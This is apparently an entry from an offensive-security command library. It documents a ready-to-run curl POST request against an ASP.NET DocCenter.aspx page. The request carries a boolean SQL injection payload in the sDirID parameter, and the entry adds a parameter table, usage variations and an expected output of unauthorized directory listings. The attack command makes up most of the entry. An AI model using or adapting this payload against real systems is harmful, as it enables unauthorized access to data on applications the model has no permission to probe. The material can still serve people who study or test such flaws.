---
data: >-
  curl -X POST /DocCenter.aspx HTTP/2 -H 'Host: target' -H 'Cookie:
  ASP.NET_SessionId=example2' -H 'User-Agent: Mozilla/5.0 (Windows NT 10.0;
  Win64; x64; rv:89.0) Gecko/20100101 Firefox/89.0' -H 'Accept: */*' -H
  'Accept-Language: en-US,en;q=0.5' -H 'Accept-Encoding: gzip, deflate' -H
  'X-Ext.net: delta=true' -H 'Content-Type: application/x-www-form-urlencoded;
  charset=UTF-8' -H 'X-Requested-With: XMLHttpRequest' -H 'Content-Length: 1158'
  -H 'Origin: https://target' -H 'Referer: https://target/DocCenter.aspx' -H
  'Te: trailers' -H 'Connection: close' -d
  'submitDirectEventConfig={"config":{"extraParams":{"sDirID":"-1 OR 3*2*1=6 AND
  000159=000159"}}}&txtSearchBox=& EVENTTARGET=ResourceManager1&
  EVENTARGUMENT=-|public|GetDirs& VIEWSTATE=example2&
  VIEWSTATEGENERATOR=3257FB69& VIEWSTATEENCRYPTED=&
  EVENTVALIDATION=XZKZsyESik7YLLhOWxyBViN4OHGIBYC69dv/YFxCKrMwtXph/JaKjl64PnZCeYHsqB2oQoae1vYg8eKaEwL71iez69IshlFY4scPU6RSP/wYfkoMN5esVeL2aj15w3XczXpAPw==&TreePanel1_SM=[{"nodeID":"Dir76","clientID":"ext-record-2","text":"Archive","path":"/root/Dir76","attributes":{"DirID":"76","checked":null,"text":""}}}]&TreePanel1_CheckNodes='
tags:
  - sqli
  - http-post
type: command
output: null
executor: bash
platforms:
  - Web
created_at: '2023-10-01T00:00:00Z'
updated_at: '2025-12-14T03:46:26.093Z'
id: 63f16b0b-aa0e-4f26-b8ac-a082c8b57373
verified: false
validated: true
submitted: true
---
# post-sqli-boolean-payload-followup

## Command

```bash
curl -X POST /DocCenter.aspx HTTP/2 \
  -H "Host: target" \
  -H "Cookie: ASP.NET_SessionId=example2" \
  -H "User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:89.0) Gecko/20100101 Firefox/89.0" \
  -H "Accept: */*" \
  -H "Accept-Language: en-US,en;q=0.5" \
  -H "Accept-Encoding: gzip, deflate" \
  -H "X-Ext.net: delta=true" \
  -H "Content-Type: application/x-www-form-urlencoded; charset=UTF-8" \
  -H "X-Requested-With: XMLHttpRequest" \
  -H "Content-Length: 1158" \
  -H "Origin: https://target" \
  -H "Referer: https://target/DocCenter.aspx" \
  -H "Te: trailers" \
  -H "Connection: close" \
  -d 'submitDirectEventConfig={"config":{"extraParams":{"sDirID":"-1 OR 3*2*1=6 AND 000159=000159"}}}&txtSearchBox=& EVENTTARGET=ResourceManager1& EVENTARGUMENT=-|public|GetDirs& VIEWSTATE=example2& VIEWSTATEGENERATOR=3257FB69& VIEWSTATEENCRYPTED=& EVENTVALIDATION=XZKZsyESik7YLLhOWxyBViN4OHGIBYC69dv/YFxCKrMwtXph/JaKjl64PnZCeYHsqB2oQoae1vYg8eKaEwL71iez69IshlFY4scPU6RSP/wYfkoMN5esVeL2aj15w3XczXpAPw==&TreePanel1_SM=[{"nodeID":"Dir76","clientID":"ext-record-2","text":"Archive","path":"/root/Dir76","attributes":{"DirID":"76","checked":null,"text":""}}}]&TreePanel1_CheckNodes='
```

## Description

Follow-up POST request demonstrating the SQLi payload in a more complete session context, including tree panel state, for proof-of-concept validation.

## Parameters

| Parameter | Description | Required |
|-----------|-------------|----------|
| submitDirectEventConfig | JSON payload with sDirID | Yes |
| EVENTTARGET | ResourceManager1 | Yes |
| EVENTARGUMENT | -|public|GetDirs | Yes |
| VIEWSTATE | Updated form state | Yes |
| EVENTVALIDATION | Updated token | Yes |
| TreePanel1_SM | Node state (e.g., Dir76) | Yes for context |

## Examples

### Basic Usage

```bash
curl -X POST https://target/DocCenter.aspx -d '...' # As above
```

### Advanced Usage

Update TreePanel1_SM for different directory contexts.

## Expected Output

Response confirming injection, e.g., listing directories like Archive (Dir76) plus unauthorized ones due to payload.

## Related

- [[commands/post-sqli-boolean-payload-initial]]
- [[procedures/Exploit-SQL-Injection-with-Malicious-POST-Request]]
